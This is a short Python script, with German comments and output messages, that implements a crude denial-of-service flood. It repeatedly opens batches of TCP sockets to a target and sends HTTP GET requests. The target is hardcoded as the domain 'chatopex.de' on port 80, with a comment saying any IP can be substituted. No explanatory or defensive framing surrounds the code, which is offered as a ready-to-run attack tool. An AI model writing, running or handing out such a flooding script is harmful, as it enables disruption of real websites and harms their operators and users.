import socket

def ddos(target, port, requests):
    for i in range(0, requests, 100):
        client_list = []
        for j in range(1000):
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target, port))
            client.sendall("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target).encode("utf-8"))
            client_list.append(client)
        for client in client_list:
            client.close()

print("Die Anfragen werden gesendet...")

if __name__ == "__main__":
    target = "chatopex.de" # Es kann jede IP eingegeben werden
    port = 80
    requests = 10000

    ddos(target, port, requests)

print("Anzahl der erledigten Requests:", requests)
